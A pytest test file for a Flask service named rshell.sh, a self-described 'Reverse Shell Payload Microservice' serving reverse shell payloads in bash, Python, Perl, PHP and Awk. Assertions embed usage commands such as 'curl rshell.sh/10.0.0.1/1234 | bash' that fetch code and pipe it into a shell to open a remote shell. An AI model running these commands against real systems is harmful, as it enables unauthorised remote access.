import pytest

# Test home page html.
def test_home(app, client):
	# GET Request tests.
	response = client.get('/')
	assert response.status_code == 200	# Return's 200 to GET requests.
	assert b"rshell.sh" in response.data
	assert b"Reverse Shell Payload Microservice" in response.data
	assert b"Examples" in response.data
	assert b"* Basic Usage:" in response.data
	assert b"curl rshell.sh/10.0.0.1/1234 | bash" in response.data
	assert b"* Different Languages:" in response.data
	assert b"curl rshell.sh/python/10.0.0.1/1234 | python" in response.data
	assert b"* Quote Wrapped:" in response.data
	assert b"curl rshell.sh/10.0.0.1/1234?q=y | xargs bash -c" in response.data
	assert b"Help Page" in response.data
	assert b"curl rshell.sh/help" in response.data
	assert b"* JSON API:" in response.data
	assert b"No Use 4 Bad Hax!!!" in response.data

	# POST Request tests.
	response = client.post('/', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.

# Test help page html.
def test_help(app, client):
	# GET Request tests.
	response = client.get('/help')
	assert response.status_code == 200	# Return's 200 to GET requests.
	assert b"rshell.sh - Help Page" in response.data
	assert b"Reverse Shell Payload Microservice" in response.data
	assert b"Supported Languages" in response.data
	assert b"Bash" in response.data
	assert b"Python3" in response.data
	assert b"Perl" in response.data
	assert b"PHP" in response.data
	assert b"Awk" in response.data
	assert b"GET Parameters" in response.data
	assert b"q" in response.data
	assert b"y" in response.data
	assert b"API Options" in response.data
	assert b"host" in response.data
	assert b"port" in response.data
	assert b"lang" in response.data
	assert b"Tips" in response.data
	assert b"Python Shell Reset" in response.data
	assert b"curl -s rshell.sh/reset" in response.data
	assert b"Command Line Friendly Help Menu" in response.data
	assert b"curl -s rshell.sh/help" in response.data
	assert b"No Use 4 Bad Hax!!!" in response.data
	assert b"Main Page" in response.data

	# POST Request tests.
	response = client.post('/', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.

# Test stabilize / reset page html.
def test_stabilize(app, client):
	# GET Request tests.
	response = client.get('/stabilize')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/reset')
	assert response.status_code == 200	# Return's 200 to GET requests.

	# POST Request tests.
	response = client.post('/reset', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.

# Testing bash page.
def test_bash(app, client):
	# GET Request tests.
	response = client.get('/bash/127.0.0.1/12345')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/127.0.0.1/12345')
	assert response.status_code == 200	# Return's 200 to GET requests.

	# POST Request tests.
	response = client.post('/bash/127.0.0.1/12345', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.

# Testing python page.
def test_python(app, client):
	# GET Request tests.
	response = client.get('/python/127.0.0.1/12345')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/python3/127.0.0.1/12345')
	assert response.status_code == 200	# Return's 200 to GET requests.

	# POST Request tests.
	response = client.post('/python/127.0.0.1/12345', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.

# Testing perl page.
def test_perl(app, client):
	# GET Request tests.
	response = client.get('/perl/127.0.0.1/12345')
	assert response.status_code == 200	# Return's 200 to GET requests.

	# POST Request tests.
	response = client.post('/perl/127.0.0.1/12345', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.

# Testing php page.
def test_php(app, client):
	# GET Request tests.
	response = client.get('/php/127.0.0.1/12345')
	assert response.status_code == 200	# Return's 200 to GET requests.

	# POST Request tests.
	response = client.post('/php/127.0.0.1/12345', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.

# Testing awk page.
def test_awk(app, client):
	# GET Request tests.
	response = client.get('/awk/127.0.0.1/12345')
	assert response.status_code == 200	# Return's 200 to GET requests.

	# POST Request tests.
	response = client.post('/awk/127.0.0.1/12345', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.
